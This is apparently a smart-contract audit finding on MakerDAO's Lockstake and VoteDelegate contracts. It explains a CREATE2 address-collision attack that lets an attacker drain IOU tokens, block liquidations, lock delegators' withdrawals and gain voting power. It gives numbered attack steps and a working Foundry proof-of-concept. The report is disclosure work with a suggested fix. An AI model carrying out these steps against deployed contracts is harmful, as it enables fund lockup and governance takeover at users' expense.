Bitter Marmalade Iguana

Medium

# An attacker can exploit VD address collisions using create2 to lock some liquidations and withdrawals in Maker protocol

## Summary

An attacker can use brute-force to find two private keys that create EOAs with the following properties:
- The first key generates a regular EOA, referred to as `eoa1`.
- The second key, when used as a salt for VD creation, produces a VD with an address identical to `eoa1`.

Since a VD (VoteDelegate) address depends solely on `msg.sender`. While this currently costs between $1.5 million and several million dollars (detailed in "Vulnerability Details"), the cost is decreasing, making the attack more feasible over time.

The attacker can approve IOU tokens to an EOA, `attacker`, and then create a VD. By transferring IOUs to another address, the attacker can lock liquidations and withdrawals for anyone using this VD.

## Vulnerability Detail


### Examples of previous issues with the same root cause: 
> All of these were judged as valid medium 
https://github.com/sherlock-audit/2024-01-napier-judging/issues/111
https://github.com/sherlock-audit/2023-12-arcadia-judging/issues/59
https://github.com/sherlock-audit/2023-07-kyber-swap-judging/issues/90
https://github.com/code-423n4/2024-04-panoptic-findings/issues/482

#### Summary
[The current cost of this attack is less than $1.5 million with current prices.](https://github.com/sherlock-audit/2024-01-napier-judging/issues/111#issuecomment-2012187767)

An attacker can find a single address collision between (1) and (2) with a high probability of success using a meet-in-the-middle technique, a classic brute-force-based attack in cryptography:
- Brute-force a sufficient number of salt values (2^80), pre-compute the resulting account addresses, and efficiently store them, e.g., in a Bloom filter.
- Brute-force contract pre-computation to find a collision with any address within the stored set from step 1.

The feasibility, detailed technique, and hardware requirements for finding a collision are well-documented:
- [Sherlock Audit Issue](https://github.com/sherlock-audit/2023-07-kyber-swap-judging/issues/90)
- [EIP-3607, which addresses this exact attack](https://eips.ethereum.org/EIPS/eip-3607)
- [Blog post discussing the cost of this attack](https://mystenlabs.com/blog/ambush-attacks-on-160bit-objectids-addresses)

The [Bitcoin network hashrate](https://www.blockchain.com/explorer/charts/hash-rate) has reached 6.5x10^20 hashes per second, taking only 31 minutes to achieve the necessary hashes. A fraction of this computing power can still find a collision within a reasonable timeframe.

### Steps:
1. The attacker finds two private keys that generate EOAs with the following properties:
	- The first key generates a regular EOA, `eoa1`.
	- The second key, `eoa2`, when used as a salt for VD creation, produces a VD with the same address as `eoa1`.

2. Call `IOU.approve(attacker, max)` from `eoa1`.
3. Call `voteDelegateFactory.create()` from `eoa2`:
	1. It creates `VD1`.
	2. `VD1` address == `eoa1` address.
	3. `VD1` retains the approvals given from `eoa1` in step 2.
4. Call `LSE.open` to create `LSUrn1`.
5. Call `LSE.lock(LSUrn1, 1000e18)` to deposit funds.
6. Call `LSE.draw(LSUrn1, attacker, maxPossible)` to borrow the maximum amount.
7. Call `LSE.selectVoteDelegate(LSUrn1, VD1)` to transfer MKR to `chief` and get `IOU` on `VD1`.
8. Call `IOU.transferFrom(VD1, attacker, maxPossible)`.
9. Now all liquidations will revert because `dog.bark` => `LSClipper.kick` => `LSE.onKick` => `LSE._selectVoteDelegate` => `VoteDelegateLike(prevVoteDelegate).free(wad);` => `chief.free(wad);` => [`IOU.burn`](https://etherscan.io/address/0x0a3f6849f78076aefaDf113F5BED87720274dDC0#code#L466) will revert.
10. The same is true for withdrawals of users who trusted this VD and delegated their funds to it, starting from `_selectVoteDelegate`, which is called on `free` and will revert:
	1. It's unexpected for users that the funds can be lost; they might only expect that their MKR could be used for malicious voting.
	2. An attacker can offer large rewards for delegating to his VD, as long as the attack remains unknown, users won't expect to lose their funds.
	3. The attacker can also use VD and all the MKR on it for malicious voting. Users didn't expect to give him voting rights indefinitely, increasing the chances of governance attacks.
	4. If the attacker could acquire a substantial amount of funds, they could select a `hat` by voting and gain full control of the protocol.

[Link to create2](https://github.com/sherlock-audit/2024-06-makerdao-endgame/blob/main/vote-delegate/src/VoteDelegateFactory.sol#L62)

### Variations:
- An `eoa1` can be replaced with a contract created by `eoa3`. The address of the contract can be brute-forced in the same way as `eoa1`. The contract performs step 2 instead of `eoa1` and self-destructs in the same transaction.
- Instead of using `eoa2` in step 1, the attacker can use a contract. A brute-forced EOA creates a contract that will create a VD such that the VD address equals `eoa1`.
	- This contract can be a marketplace to sell voting power from the beginning or a proxy, allowing the attacker to profit by selling acquired voting power to others.

## Impact

The attacker can create non-liquidatable positions. All users who select the attacker's VD can lose their funds. All votes are permanently locked on the attacker's VD and can be used by the attacker for voting. Instead of `eoa2`, a contract can be used to allow others to vote and sell voting power, similar to [Curve bribing](https://hackernoon.com/inside-the-curve-wars-defi-bribes) or other governance attacks.

If the attacker could acquire a substantial amount of funds, they could select a `hat` by voting and gain full control of the protocol.

## Code Snippet
>PoC
1. Create `test/ALockstakeEngine.sol` in the root project directory.
<details><summary> test/ALockstakeEngine.sol</summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0-or-later

pragma solidity ^0.8.21;

import "../dss-flappers/lib/dss-test/src//DssTest.sol";
import "../dss-flappers/lib/dss-test/lib/dss-interfaces/src/Interfaces.sol";
import { LockstakeDeploy } from "../lockstake/deploy/LockstakeDeploy.sol";
import { LockstakeInit, LockstakeConfig, LockstakeInstance } from "../lockstake/deploy/LockstakeInit.sol";
import { LockstakeMkr } from "../lockstake/src/LockstakeMkr.sol";
import { LockstakeEngine } from "../lockstake/src/LockstakeEngine.sol";
import { LockstakeClipper } from "../lockstake/src/LockstakeClipper.sol";
import { LockstakeUrn } from "../lockstake/src/LockstakeUrn.sol";
import { VoteDelegateFactoryMock, VoteDelegateMock } from "../lockstake/test/mocks/VoteDelegateMock.sol";
import { GemMock } from "../lockstake/test/mocks/GemMock.sol";
import { NstMock } from "../lockstake/test/mocks/NstMock.sol";
import { NstJoinMock } from "../lockstake/test/mocks/NstJoinMock.sol";
import { StakingRewardsMock } from "../lockstake/test/mocks/StakingRewardsMock.sol";
import { MkrNgtMock } from "../lockstake/test/mocks/MkrNgtMock.sol";

import {VoteDelegateFactory} from "../vote-delegate/src/VoteDelegateFactory.sol";
import {VoteDelegate} from "../vote-delegate/src/VoteDelegate.sol";


contract DSChiefLike  {
    DSTokenAbstract public IOU;
    DSTokenAbstract public GOV;
    mapping(address=>uint256) public deposits;
    function free(uint wad) public {}
    function lock(uint wad) public {}
}

interface CalcFabLike {
    function newLinearDecrease(address) external returns (address);
}

interface LineMomLike {
    function ilks(bytes32) external view returns (uint256);
}

interface MkrAuthorityLike {
    function rely(address) external;
}

contract ALockstakeEngineTest is DssTest {
    using stdStorage for StdStorage;

    DssInstance             dss;
    address                 pauseProxy;
    DSTokenAbstract         mkr;
    LockstakeMkr            lsmkr;
    LockstakeEngine         engine;
    LockstakeClipper        clip;
    address                 calc;
    MedianAbstract          pip;
    VoteDelegateFactory     voteDelegateFactory;
    NstMock                 nst;
    NstJoinMock             nstJoin;
    GemMock                 rTok;
    StakingRewardsMock      farm;
    StakingRewardsMock      farm2;
    MkrNgtMock              mkrNgt;
    GemMock                 ngt;
    bytes32                 ilk = "LSE";
    address                 voter;
    address                 voteDelegate;

    LockstakeConfig     cfg;

    uint256             prevLine;
    
    address constant LOG = 0xdA0Ab1e0017DEbCd72Be8599041a2aa3bA7e740F;

    event AddFarm(address farm);
    event DelFarm(address farm);
    event Open(address indexed owner, uint256 indexed index, address urn);
    event Hope(address indexed urn, address indexed usr);
    event Nope(address indexed urn, address indexed usr);
    event SelectVoteDelegate(address indexed urn, address indexed voteDelegate_);
    event SelectFarm(address indexed urn, address farm, uint16 ref);
    event Lock(address indexed urn, uint256 wad, uint16 ref);
    event LockNgt(address indexed urn, uint256 ngtWad, uint16 ref);
    event Free(address indexed urn, address indexed to, uint256 wad, uint256 freed);
    event FreeNgt(address indexed urn, address indexed to, uint256 ngtWad, uint256 ngtFreed);
    event FreeNoFee(address indexed urn, address indexed to, uint256 wad);
    event Draw(address indexed urn, address indexed to, uint256 wad);
    event Wipe(address indexed urn, uint256 wad);
    event GetReward(address indexed urn, address indexed farm, address indexed to, uint256 amt);
    event OnKick(address indexed urn, uint256 wad);
    event OnTake(address indexed urn, address indexed who, uint256 wad);
    event OnRemove(address indexed urn, uint256 sold, uint256 burn, uint256 refund);

    function _divup(uint256 x, uint256 y) internal pure returns (uint256 z) {
        // Note: _divup(0,0) will return 0 differing from natural solidity division
        unchecked {
            z = x != 0 ? ((x - 1) / y) + 1 : 0;
        }
    }

    // Real contracts for mainnet
    address chief = 0x0a3f6849f78076aefaDf113F5BED87720274dDC0;
    address polling = 0xD3A9FE267852281a1e6307a1C37CDfD76d39b133;
    uint chiefBalanceBeforeTests;

    function setUp() public virtual {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 20422954);

        dss = MCD.loadFromChainlog(LOG);

        pauseProxy = dss.chainlog.getAddress("MCD_PAUSE_PROXY");
        pip = MedianAbstract(dss.chainlog.getAddress("PIP_MKR"));
        mkr = DSTokenAbstract(dss.chainlog.getAddress("MCD_GOV"));
        nst = new NstMock();
        nstJoin = new NstJoinMock(address(dss.vat), address(nst));
        rTok = new GemMock(0);
        ngt = new GemMock(0);
        mkrNgt = new MkrNgtMock(address(mkr), address(ngt), 24_000);
        vm.startPrank(pauseProxy);
        MkrAuthorityLike(mkr.authority()).rely(address(mkrNgt));
        vm.stopPrank();

        // voteDelegateFactory = new VoteDelegateFactoryMock(address(mkr));
        voteDelegateFactory = new VoteDelegateFactory(
            chief, polling
        );
        voter = address(123);
        vm.prank(voter); voteDelegate = voteDelegateFactory.create();

        vm.prank(pauseProxy); pip.kiss(address(this));
        vm.store(address(pip), bytes32(uint256(1)), bytes32(uint256(1_500 * 10**18)));

        LockstakeInstance memory instance = LockstakeDeploy.deployLockstake(
            address(this),
            pauseProxy,
            address(voteDelegateFactory),
            address(nstJoin),
            ilk,
            15 * WAD / 100,
            address(mkrNgt),
            bytes4(abi.encodeWithSignature("newLinearDecrease(address)"))
        );

        engine = LockstakeEngine(instance.engine);
        clip = LockstakeClipper(instance.clipper);
        calc = instance.clipperCalc;
        lsmkr = LockstakeMkr(instance.lsmkr);
        farm = new StakingRewardsMock(address(rTok), address(lsmkr));
        farm2 = new StakingRewardsMock(address(rTok), address(lsmkr));

        address[] memory farms = new address[](2);
        farms[0] = address(farm);
        farms[1] = address(farm2);

        cfg = LockstakeConfig({
            ilk: ilk,
            voteDelegateFactory: address(voteDelegateFactory),
            nstJoin: address(nstJoin),
            nst: address(nstJoin.nst()),
            mkr: address(mkr),
            mkrNgt: address(mkrNgt),
            ngt: address(ngt),
            farms: farms,
            fee: 15 * WAD / 100,
            maxLine: 10_000_000 * 10**45,
            gap: 1_000_000 * 10**45,
            ttl: 1 days,
            dust: 50,
            duty: 100000001 * 10**27 / 100000000,
            mat: 3 * 10**27,
            buf: 1.25 * 10**27, // 25% Initial price buffer
            tail: 3600, // 1 hour before reset
            cusp: 0.2 * 10**27, // 80% drop before reset
            chip: 2 * WAD / 100,
            tip: 3,
            stopped: 0,
            chop: 1 ether,
            hole: 10_000 * 10**45,
            tau: 100,
            cut: 0,
            step: 0,
            lineMom: true,
            tolerance: 0.5 * 10**27,
            name: "LOCKSTAKE",
            symbol: "LMKR"
        });

        prevLine = dss.vat.Line();

        vm.startPrank(pauseProxy);
        LockstakeInit.initLockstake(dss, instance, cfg);
        vm.stopPrank();

        deal(address(mkr), address(this), 100_000 * 10**18, true);
        deal(address(ngt), address(this), 100_000 * 24_000 * 10**18, true);

        // Add some existing DAI assigned to nstJoin to avoid a particular error
        stdstore.target(address(dss.vat)).sig("dai(address)").with_key(address(nstJoin)).depth(0).checked_write(100_000 * RAD);

        chiefBalanceBeforeTests = mkr.balanceOf(chief);
    }

}
```
</details>

It is based on the `LockstakeEngine.t.sol` `setUp` function:
- Fixed imports
- Added `block.number` for caching RPC calls
- Added `chief` and `polling` contracts from mainnet
- Added the real `VoteDelegateFactory`

To see the diff, you can run `git diff`. Note: all other functions except `setUp` are removed from the file and the diff.

<details> <summary>git diff --no-index  lockstake/test/LockstakeEngine.t.sol test/ALockstakeEngine.sol</summary> 
	
```diff
diff --git a/lockstake/test/LockstakeEngine.t.sol b/test/ALockstakeEngine.sol
index 83fa75d..ba4f381 100644
--- a/lockstake/test/LockstakeEngine.t.sol
+++ b/test/ALockstakeEngine.sol
@@ -2,20 +2,32 @@
 
 pragma solidity ^0.8.21;
 
-import "dss-test/DssTest.sol";
-import "dss-interfaces/Interfaces.sol";
-import { LockstakeDeploy } from "deploy/LockstakeDeploy.sol";
-import { LockstakeInit, LockstakeConfig, LockstakeInstance } from "deploy/LockstakeInit.sol";
-import { LockstakeMkr } from "src/LockstakeMkr.sol";
-import { LockstakeEngine } from "src/LockstakeEngine.sol";
-import { LockstakeClipper } from "src/LockstakeClipper.sol";
-import { LockstakeUrn } from "src/LockstakeUrn.sol";
-import { VoteDelegateFactoryMock, VoteDelegateMock } from "test/mocks/VoteDelegateMock.sol";
-import { GemMock } from "test/mocks/GemMock.sol";
-import { NstMock } from "test/mocks/NstMock.sol";
-import { NstJoinMock } from "test/mocks/NstJoinMock.sol";
-import { StakingRewardsMock } from "test/mocks/StakingRewardsMock.sol";
-import { MkrNgtMock } from "test/mocks/MkrNgtMock.sol";
+import "../dss-flappers/lib/dss-test/src//DssTest.sol";
+import "../dss-flappers/lib/dss-test/lib/dss-interfaces/src/Interfaces.sol";
+import { LockstakeDeploy } from "../lockstake/deploy/LockstakeDeploy.sol";
+import { LockstakeInit, LockstakeConfig, LockstakeInstance } from "../lockstake/deploy/LockstakeInit.sol";
+import { LockstakeMkr } from "../lockstake/src/LockstakeMkr.sol";
+import { LockstakeEngine } from "../lockstake/src/LockstakeEngine.sol";
+import { LockstakeClipper } from "../lockstake/src/LockstakeClipper.sol";
+import { LockstakeUrn } from "../lockstake/src/LockstakeUrn.sol";
+import { VoteDelegateFactoryMock, VoteDelegateMock } from "../lockstake/test/mocks/VoteDelegateMock.sol";
+import { GemMock } from "../lockstake/test/mocks/GemMock.sol";
+import { NstMock } from "../lockstake/test/mocks/NstMock.sol";
+import { NstJoinMock } from "../lockstake/test/mocks/NstJoinMock.sol";
+import { StakingRewardsMock } from "../lockstake/test/mocks/StakingRewardsMock.sol";
+import { MkrNgtMock } from "../lockstake/test/mocks/MkrNgtMock.sol";
+
+import {VoteDelegateFactory} from "../vote-delegate/src/VoteDelegateFactory.sol";
+import {VoteDelegate} from "../vote-delegate/src/VoteDelegate.sol";
+
+
+contract DSChiefLike  {
+    DSTokenAbstract public IOU;
+    DSTokenAbstract public GOV;
+    mapping(address=>uint256) public deposits;
+    function free(uint wad) public {}
+    function lock(uint wad) public {}
+}
 
 interface CalcFabLike {
     function newLinearDecrease(address) external returns (address);
@@ -29,7 +41,7 @@ interface MkrAuthorityLike {
     function rely(address) external;
 }
 
-contract LockstakeEngineTest is DssTest {
+contract ALockstakeEngineTest is DssTest {
     using stdStorage for StdStorage;
 
     DssInstance             dss;
@@ -40,7 +52,7 @@ contract LockstakeEngineTest is DssTest {
     LockstakeClipper        clip;
     address                 calc;
     MedianAbstract          pip;
-    VoteDelegateFactoryMock voteDelegateFactory;
+    VoteDelegateFactory     voteDelegateFactory;
     NstMock                 nst;
     NstJoinMock             nstJoin;
     GemMock                 rTok;
@@ -84,8 +96,13 @@ contract LockstakeEngineTest is DssTest {
         }
     }
 
-    function setUp() public {
-        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
+    // Real contracts for mainnet
+    address chief = 0x0a3f6849f78076aefaDf113F5BED87720274dDC0;
+    address polling = 0xD3A9FE267852281a1e6307a1C37CDfD76d39b133;
+    uint chiefBalanceBeforeTests;
+
+    function setUp() public virtual {
+        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 20422954);
 
         dss = MCD.loadFromChainlog(LOG);
 
@@ -101,7 +118,10 @@ contract LockstakeEngineTest is DssTest {
         MkrAuthorityLike(mkr.authority()).rely(address(mkrNgt));
         vm.stopPrank();
 
-        voteDelegateFactory = new VoteDelegateFactoryMock(address(mkr));
+        // voteDelegateFactory = new VoteDelegateFactoryMock(address(mkr));
+        voteDelegateFactory = new VoteDelegateFactory(
+            chief, polling
+        );
         voter = address(123);
         vm.prank(voter); voteDelegate = voteDelegateFactory.create();
```
	
</details>

2. Add the following `remappings.txt` to the root project directory.
```txt
dss-interfaces/=dss-flappers/lib/dss-test/lib/dss-interfaces/src/
dss-test/=dss-flappers/lib/dss-test/src/
forge-std/=dss-flappers/lib/dss-test/lib/forge-std/src/
@openzeppelin/contracts/=sdai/lib/openzeppelin-contracts-upgradeable/lib/openzeppelin-contracts/contracts/
@openzeppelin/contracts-upgradeable/=sdai/lib/openzeppelin-contracts-upgradeable/contracts/
solidity-stringutils=nst/lib/openzeppelin-foundry-upgrades/lib/solidity-stringutils/
lockstake:src/=lockstake/src/
vote-delegate:src/=vote-delegate/src/
sdai:src/=sdai/src/
```

3. Run `forge test --match-path test/ALSEH3.sol` from the root project directory.
```solidity
// SPDX-License-Identifier: AGPL-3.0-or-later

pragma solidity ^0.8.21;

import "./ALockstakeEngine.sol";

contract VoteDelegateLike {
    mapping(address => uint256) public stake; 
}

interface GemLike {
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
    function transferFrom(address, address, uint256) external;
    function balanceOf(address) external view returns (uint256);
}

interface ChiefLike {
    function GOV() external view returns (GemLike);
    function IOU() external view returns (GemLike);
    function lock(uint256) external;
    function free(uint256) external;
    function vote(address[] calldata) external returns (bytes32);
    function vote(bytes32) external;
    function deposits(address) external returns (uint);
}

contract ALSEH3 is ALockstakeEngineTest {
    // Address used by the attacker, a regular EOA
    address attacker = makeAddr("attacker");
    // Address brute-forced by the attacker to make a VD that matches an EOA controlled by the attacker
    address minedVDCreator = makeAddr("minedUrnCreator");

    address[] users = [
        makeAddr("user1"),
        makeAddr("user2"),
        makeAddr("user3")
    ];

    uint mkrAmount = 100_000 * 10**18;

    address eoaVD;
    GemLike iou;

    function setUp() public override {
        // Call the parent setUp
        super.setUp();

        // This VD will have the same address as an EOA controlled by the attacker
        eoaVD = voteDelegateFactory.getAddress(minedVDCreator);
        iou = ChiefLike(chief).IOU();

        // Call from the EOA, the urn is not created yet
        vm.prank(eoaVD); iou.approve(attacker, type(uint).max);

        // Create the VD, can't use EOA anymore as per EIP-3607
        vm.prank(minedVDCreator); eoaVD = voteDelegateFactory.create();
        
        // Simulate several other urns
        _createUrnDepositDrawForUsers();
    }

    function testAttack1LockSelfLiquidation() external {
        _createUrnDepositDrawForUser(attacker, eoaVD);

        _testLiquidateUsingDog({user: attacker, expectRevert: false, revertMsg: ""});

        vm.prank(attacker); iou.transferFrom(eoaVD, attacker, mkrAmount);
        _testLiquidateUsingDog({user: attacker, expectRevert: true, revertMsg: "ds-token-insufficient-balance"});
    }

    function testAttack2LockWithdrawalsForOthers() external {
        _changeBlockNumberForChief();
        console.log("Voting power on eoaVD before users selected: %e", ChiefLike(chief).deposits(eoaVD));
        // Some users trusted this VD
        for (uint i; i < users.length; i++){
            address usr = users[i];
            address urn = engine.getUrn(usr, 0);
            vm.prank(usr); engine.selectVoteDelegate(urn, eoaVD);
        }

        console.log("Voting power on eoaVD after users selected: %e", ChiefLike(chief).deposits(eoaVD));

        _testLiquidateUsingDog({expectRevert: false, revertMsg: ""});
        uint eoaVdIouBalance = ChiefLike(chief).deposits(eoaVD);
        vm.prank(attacker); iou.transferFrom(eoaVD, attacker, eoaVdIouBalance);
        console.log("Voting power on eoaVD after withdrawing IOU: %e", ChiefLike(chief).deposits(eoaVD));

        _testLiquidateUsingDog({expectRevert: true, revertMsg: "ds-token-insufficient-balance"});

        for (uint i; i < users.length; i++){
            address usr = users[i];
            address urn = engine.getUrn(usr, 0);
            (uint256 ink,) = dss.vat.urns(ilk, urn);

            vm.startPrank(usr);
            nst.approve(address(engine), type(uint).max);
            engine.wipeAll(urn);

            vm.expectRevert("ds-token-insufficient-balance");
            engine.free(urn, usr, 1);

            vm.expectRevert("ds-token-insufficient-balance");
            engine.free(urn, usr, ink);
        }
    }

    // Chief won't allow withdrawal in the same block as the deposit
    function _changeBlockNumberForChief() internal {
        vm.roll(block.number + 1);
    }

    function _testLiquidateUsingDog(address user, bool expectRevert, string memory revertMsg) internal {
        _changeBlockNumberForChief();
        uint sId = vm.snapshot();

        address urn = engine.getUrn(user, 0);

        // Force urn unsafe
        vm.store(address(pip), bytes32(uint256(1)), bytes32(uint256(0.05 * 10**18)));
        dss.spotter.poke(ilk);

        if (expectRevert) vm.expectRevert(bytes(revertMsg));
        dss.dog.bark(ilk, urn, makeAddr("kpr"));

        vm.revertTo(sId);
    }

    function _testLiquidateUsingDog(bool expectRevert, string memory revertMsg) internal {
        for (uint i; i < users.length; i++){
            address user = users[i];
            _testLiquidateUsingDog(user, expectRevert, revertMsg);
        }
    }

    function _createUrnDepositDrawForUsers() internal {
        for (uint i; i < users.length; i++){
            _createUrnDepositDrawForUser(users[i], voteDelegate);
        }
    }

    function _createUrnDepositDrawForUser(address user, address _voteDelegate) internal {
        deal(address(mkr), user, mkrAmount);

        vm.startPrank(user);

        mkr.approve(address(engine), type(uint).max);
        address urn = engine.open(0);
        engine.lock(urn, mkrAmount, 0);
        engine.selectVoteDelegate(urn, _voteDelegate);
        engine.draw(urn, user, mkrAmount/50); // same proportion as in original LSE test

        vm.stopPrank();
    }
}
```


## Tool used

Manual Review

## Recommendation

- Prevent users from controlling the `salt`, including using `msg.sender`.
- Additionally, consider combining and encoding `block.prevrandao` with `msg.sender`. This approach will make finding a collision practically impossible within the short timeframe that `prevrandao` is known.